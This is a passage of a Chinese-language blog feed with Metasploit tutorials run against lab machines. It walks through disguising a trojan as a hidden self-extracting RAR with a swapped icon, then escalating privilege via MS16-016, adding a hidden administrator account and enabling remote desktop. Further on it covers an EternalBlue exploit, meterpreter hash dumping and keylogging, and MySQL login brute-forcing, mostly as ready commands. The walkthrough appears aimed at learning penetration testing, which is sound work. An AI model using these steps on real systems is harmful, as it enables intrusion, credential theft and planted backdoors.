<li>在第四步中，一个txt文件按常理历来说是达不到80多MB的，这样直接就从文件大小直接反映了问题，所以需要伪装一下。</li>
</ol>
<h3 id="2-对rar木马文件进行伪装">2. 对RAR木马文件进行伪装</h3>
<ol>
<li>这里重新弄了两个文件</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617192336284.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ol start="2">
<li>解压路径还是那样，最好不要被发现</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617192360028.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ol start="4">
<li>这里两个文件的顺序可以颠倒</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617192367342.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ol start="6">
<li>解压到临时文件夹是为了隐蔽，但是实际中是不勾选的，全部隐藏要选。</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617192380588.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ol start="7">
<li>在更新中，更改更新模式为解压并更新文件，更改覆盖模式为覆盖所有文件，这步很重要。</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617192399285.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ol start="8">
<li>使用BeCyIconGrabber以及Resource Hacker对文件进行伪装。</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617192415771.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ol start="9">
<li>目标机状况</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617193540401.png" alt="" loading="lazy"></li>
</ul>
<h1 id="2-msf提权">2. MSF提权</h1>
<p><em>提权的漏洞在./exploit/windows/local目录下</em></p>
<ol>
<li>我们使用上述的木马打到了，获得了shell，是user权限，但是权限并不是最高的，但是可以通过一些方式提升到system权限。</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617199300467.png" alt="" loading="lazy"></li>
</ul>
<ol start="2">
<li>输入命令。</li>
</ol>
<pre><code class="language-shell"># 把当前的metasploit shell转为后台运行。
background

# 我选择了ms16-016这个漏洞在进行提权
search ms16-016

# 选择漏洞，查看设置参数
use exploit/windows/local/ms16_016_webdav
info | show options
* 可以看见只有一个SESSION参数要设置，是后门连接的id号，我这里是2。

# 进行提权
run | exploit
* 虽然提权成功了 但你getuid下还是看见的是user权限

# 查看进程下面，确认漏洞已经运行的PID进程685
ps

# 根据进程的提示我们确实是system权限，还要用到migrate 命令来迁移到一个指定的进程ID。
migrate 685

# getuid查看，提权成功。

# 添加用户并添加为管理员组
user a a /add
net localgroup administrators a /add

# 用Nmap扫下并没有开启远程登陆3389
nmap -a 192.168.200.137

# 开启目标主机3389
run getgui -e  
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[# MSF攻击使用(四)]]></title>
        <id>https://kite-007.github.io/msf-zhi-exploits-mo-kuai-shi-yong/</id>
        <link href="https://kite-007.github.io/msf-zhi-exploits-mo-kuai-shi-yong/">
        </link>
        <updated>2021-03-30T11:10:02.000Z</updated>
        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
<li><a href="#1-exploit%E7%AE%80%E8%A6%81%E6%B5%81%E7%A8%8B">1. exploit简要流程</a></li>
<li><a href="#2-payload%E9%80%89%E6%8B%A9">2. payload选择</a></li>
<li><a href="#3-msf-run%E5%8F%82%E6%95%B0">3. MSF run参数</a></li>
<li><a href="#4-meterpreter">4. meterpreter</a></li>
<li><a href="#5-auxiliary%E7%AE%80%E8%A6%81%E6%B5%81%E7%A8%8B">5. auxiliary简要流程</a>
<ul>
<li><a href="#1-syn%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F">1. SYN端口扫描</a></li>
<li><a href="#2-smb%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF">2. SMB获取系统信息</a></li>
<li><a href="#3-%E6%9C%8D%E5%8A%A1%E8%AF%86%E5%88%AB">3. 服务识别</a></li>
<li><a href="#4-%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2">4. 密码嗅探</a></li>
<li><a href="#5-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81">5. 身份验证</a></li>
</ul>
</li>
</ul>
(MSF)</p>
<h1 id="1-exploit简要流程">1. exploit简要流程</h1>
<p><strong>以win 7 与ms17-010实例</strong></p>
<ol>
<li>目标主机，需要能够ping通</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617105121301.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ol start="2">
<li>攻击前，搜索所需要使用的漏洞</li>
</ol>
<pre><code class="language-shell">search ms17-010
</code></pre>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617103946003.png" alt="" loading="lazy"></li>
<li>辅助模块，可以用于查看是否存在该漏洞。</li>
</ul>
<hr>
<ol start="3">
<li>攻击流程，选择漏洞</li>
</ol>
<pre><code class="language-shell">use exploit/windows/smb/ms17_010_eternalblue
</code></pre>
<hr>
<ol start="4">
<li>查看选项，设置变量</li>
</ol>
<pre><code class="language-shell">show options 
show targets

set RHOST 192.168.200.142
set target 0
</code></pre>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617105458664.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ol start="5">
<li>寻找想要使用的payload</li>
</ol>
<pre><code class="language-shell">show payloads

set payload windows/x64/exec

show options

# win下添加用户的命令
set CMD net user newuser newuser /add

show options
</code></pre>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617105580722.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ol start="6">
<li>测试</li>
</ol>
<pre><code class="language-shell">run
</code></pre>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617105617016.png" alt="" loading="lazy"></li>
</ul>
<hr>
<h1 id="2-payload选择">2. payload选择</h1>
<p>payload名称命名规则：<br>
_find_tag：在一个已建立的链接上。<br>
_reverse_tcp：反向连接到攻击者主机。<br>
bind_tcp：监听一个tcp连接<br>
reverse_http：反向链接通过HTTP隧道</p>
<ul>
<li>正向与反向：
<ul>
<li>主机IP：192.168.200.137</li>
<li>目标IP：192.168.200.142</li>
<li>反向：目标IP请求主机IP</li>
<li>正向：主机IP请求目标IP</li>
</ul>
</li>
</ul>
<p>--假如目标IP为公网IP（180.12.12.12），则反向连接{公网IP--》主机IP}不能连接。<br>
--但是正向连接{主机IP--》公网IP}可以连接。</p>
<p>(三次握手)</p>
<ol>
<li>客户端发送SYN包给服务端</li>
<li>服务端收到之后，回SYN和ACK包返回</li>
<li>客户端发送ACK回复收到</li>
</ol>
<hr>
<h1 id="3-msf-run参数">3. MSF run参数</h1>
<ul>
<li>如果入侵之后要想返回操作去使用其他漏洞进行攻击，使用参数</li>
</ul>
<pre><code class="language-shell">-e&lt;opt&gt;要使用的有效载荷编码器。如果没有指定，则使用编码器
-f 强制开发漏洞，而不考虑极小值的大小。
-h 帮助
-j 后台运行。。
-n &lt;opt&gt;使用NOP发生器。如果没有指定，则使用NOP。
-o &lt;opt&gt;在VAR=VALL格式中的逗号分隔选项列表。
-p &lt;opt&gt;使用的有效载荷。如果没有指定，则使用有效载荷。
-t &lt;opt&gt; 要使用的目标索引或名称。如果没有指定，则使用目标。
-z 在成功开发后不与会话交互。
</code></pre>
<hr>
<h1 id="4-meterpreter">4. meterpreter</h1>
<pre><code class="language-shell">session 查看所有肉鸡列表
session -l 查看在线肉鸡列表(可以进行控制的)
exploit 执行渗透攻击或模块来攻击目标。
sessions -i 1打开建立的第一个会话
·getuid 查看UID
·sysinfo 查看攻击主机的系统信息
run hashdump dump 目标主机的hash帐号信息，备份进行暴破PS.查看目标主机进程
migrate 1576(pid)切换自己为管理员，1576是管理员的进程
keyscan_start，开启健盘记录功能
keyscan_dump 查看健盘记录信息
keyscan_stop.停止健盘记录
run getgui-e 远程开启目标主机的远程桌面
run getgui-u cisco -p cisco 远程添加目标主机帐号密码
rdesktop 192.168.1.100 远程桌面
</code></pre>
<h1 id="5-auxiliary简要流程">5. auxiliary简要流程</h1>
<p><strong>以win 7为例</strong></p>
<h2 id="1-syn端口扫描">1. SYN端口扫描</h2>
<p><em>SYN：同步序列编号（Synchronize Sequence Numbers）。是TCP/IP建立连接时使用的握手信号。在客户机和服务器之间建立正常的TCP网络连接时，客户机首先发出一个SYN消息，服务器使用SYN+ACK应答表示接收到了这个消息，最后客户机再以ACK消息响应。这样在客户机和服务器之间才能建立起可靠的TCP连接，数据才可以在客户机和服务器之间传递。</em><br>
<em>TCP连接的第一个包，非常小的一种数据包。SYN 攻击包括大量此类的包，由于这些包看上去来自实际不存在的站点，因此无法有效进行处理。每个机器的欺骗包都要花几秒钟进行尝试方可放弃提供正常响应。</em></p>
<pre><code class="language-shell"># 搜索出关于端口扫描的模块
search portscan 

# 使用SYN扫描模块
use auxiliary/scanner/portscan/syn 

# 显示需要设置的选项
info | show options

# 设置网卡信息 注意网卡名称ens33与eth0等等
set INTERFACE ens33

# 设置扫描端口与目的主机，线程
set PORTS 1-500
set RHOSTS 192.168.200.142
set THREADS 100

run
* 当提示权限不足时使用sudo命令来启动MSF即可解决

quit | exit | back
</code></pre>
<h2 id="2-smb获取系统信息">2. SMB获取系统信息</h2>
<p><em>SMB(全称是Server Message Block)是一个协议名，它能被用于Web连接和客户端与服务器之间的信息沟通。</em></p>
<pre><code class="language-shell">search scanner smb

use auxiliary/scanner/smb/smb_version

info

set RHOST 192.168.200.142

run
</code></pre>
<h2 id="3-服务识别">3. 服务识别</h2>
<ol>
<li>ssh扫描识别</li>
</ol>
<pre><code class="language-shell">search auxiliary ssh version

use auxiliary/scanner/ssh/ssh_version

info

set RHOSTS 192.168.200.142
* 还可以自己指定范围或者多个端口
set RHOSTS 192.168.200.1-255
set RHOSTS 192.168.200.142 192.168.200.143

run
</code></pre>
<ol start="2">
<li>ftp扫描识别</li>
</ol>
<pre><code>search auxiliary ftp version

use auxiliary/scanner/ftp/ftp_version

info

set RHOSTS 192.168.200.142

run
</code></pre>
<h2 id="4-密码嗅探">4. 密码嗅探</h2>
<p><em>psnuffle</em></p>
<h2 id="5-身份验证">5. 身份验证</h2>
<p><em>login</em></p>
<pre><code>search auxiliary mysql login

use auxiliary/scanner/mysql/mysql_login

info

#找一个测试爆破的用户名字典和密码字典进行爆破

#设置用户字典
set user_file  /usr/share/metasploit-framework/data/wordlists/unix_users.txt  
#设置密码字典
set pass_file   /usr/share/sparta/wordlists/mysql-default-userpass.txt  

run 开始爆破..，知道看到绿色加号即为破解成功！
</code></pre>
]]></content>
    </entry>
</feed>